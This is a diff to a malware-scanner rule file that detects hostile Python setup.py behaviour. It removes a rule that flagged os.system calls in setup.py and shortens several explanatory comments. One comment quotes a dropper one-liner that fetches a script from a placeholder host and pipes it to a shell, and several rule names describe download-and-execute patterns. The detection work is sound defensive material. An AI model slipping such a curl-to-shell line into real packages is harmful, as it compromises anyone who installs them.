@@ -570,15 +570,10 @@ traits:
     for: [python]
     if:
       type: text
-      substr: "openrewrite"  # Benign-context suppressor for the standard sdist clean command,
-  # `os.system("rm -rf ./build ./dist ./*.egg-info")`. It previously lived in
-  # composite_rules with BOTH an `all:` clause and this `if:` regex; a rule
-  # carrying `all:` loads as a composite and the inline `if:` was dropped, so
-  # the regex never applied and what remained was "a setup.py that calls
-  # os.system". That is also exactly the two legs of setup-py-os-system-file,
-  # which lists this in `unless:` -- requirement and suppressor were the same
-  # fact, so that rule could never fire. Anchoring on `.egg-info` keeps this
-  # narrow: it is a Python build artifact, not something a dropper names.
+      substr: "openrewrite"  # Benign context for standard sdist cleanup.
+  # The cleanup matcher below is intentionally specific to deleting the
+  # package's generated .egg-info tree; generic setup.py command execution is
+  # a neutral micro-behavior and is not a supply-chain conclusion.
   - id: setup-py-clean-command-removes-build-artifacts
     desc: setup.py clean removes build artifacts
     crit: notable
@@ -714,40 +709,6 @@ composite_rules:
     all:
       - id: metadata/build/pip::root-setup-py
       - id: requests-get-near-os-system
-  - id: setup-py-os-system-file
-    desc: setup.py invokes os.system
-    crit: suspicious
-    conf: 0.95
-    for: [python]
-    # `scope: leaf` -> `file`: root-setup-py is path/identity evidence, which
-    # does not share a leaf key with the file's content evidence, so under
-    # `leaf` the two legs could never co-occur. `file` still keys to the single
-    # setup.py member, so an archive cannot pool "a setup.py exists" with an
-    # os.system call sitting in some unrelated module.
-    scope: file
-    # `near_bytes` removed: one leg is root-setup-py, a path/identity fact with
-    # no byte location in the file, so proximity against a code fact could
-    # never be satisfied and the rule was unsatisfiable regardless of content.
-    # It also bought nothing semantically -- both legs are statements about the
-    # same single file, not about two things that need to sit near each other.
-    unless:
-      - id: metadata/package/testing/presence/harness/
-      - id: metadata/build/pip::python-packaging-tool-tests
-      - id: setup-py-clean-command-removes-build-artifacts
-      - id: well-known/app/finance/electron-cash/
-    # The bare `dunder-import-call` leg (any `__import__`) was removed because it
-    # fired on the benign `__import__("os").path.exists("README.md")` idiom that
-    # setup.py files use for long_description, mislabeling it as an os.system
-    # invocation. An earlier note here claimed `python-os-system` already covered
-    # the obfuscated `__import__("os").system(...)` spelling as well; it does not
-    # -- its regex is `\bos\.system\s*\(`, and in that spelling the characters
-    # before `.system` are `")`. Both spellings are now listed explicitly, so
-    # dropping the over-broad leg costs no coverage.
-    all:
-      - id: metadata/build/pip::root-setup-py
-    any:
-      - id: micro-behaviors/process/create/system::python-os-system
-      - id: micro-behaviors/process/create/system::python-dunder-import-os-system
   - id: python-setup-encoded-dropper
     desc: setup.py decodes and executes downloaded payload
     crit: hostile
@@ -816,9 +777,9 @@ composite_rules:
   # commonest one-liner form fell through both filters: a root setup.py doing
   #   os.system("curl -s https://host/i.sh | sh")
   # contains neither anchor (a dropper does not mention its own filename) and has
-  # no Python exec sink -- the shell does the executing. It reached one suspicious
-  # atom (setup-py-os-system-file) and risk 40, while the same command in an npm
-  # postinstall reaches 268.
+  # no Python exec sink -- the shell does the executing. The dedicated
+  # setup-py-download-pipe-shell rule below covers this form, while a plain
+  # publish or build command remains outside the supply-chain objective.
   #
   # Uses the packaging *identity* fact rather than a text anchor, and requires
   # the pipe to sit in an execution call, so a setup.py that merely quotes
@@ -905,13 +866,8 @@ composite_rules:
     for: [python]
     scope: leaf
     any:
-      # setup-py-os-system-file is deliberately NOT a leg here. Every other
-      # alternative below requires download-and-execute; that one requires only
-      # "a root setup.py calls os.system", which legitimate build scripts do to
-      # run make, drive a compiler or generate sources -- verified: a setup.py
-      # whose only shell call is `os.system("make -j4")` was convicted hostile
-      # while this leg was present. It stands on its own at `suspicious`, the
-      # criticality the trait itself declares.
+      # Every alternative below requires download-and-execute; ordinary setup.py
+      # build commands are intentionally left to the neutral process traits.
       - id: setup-py-curl-exec
       - id: setup-py-urlopen-exec
       - id: setup-py-wget-tmp-bash
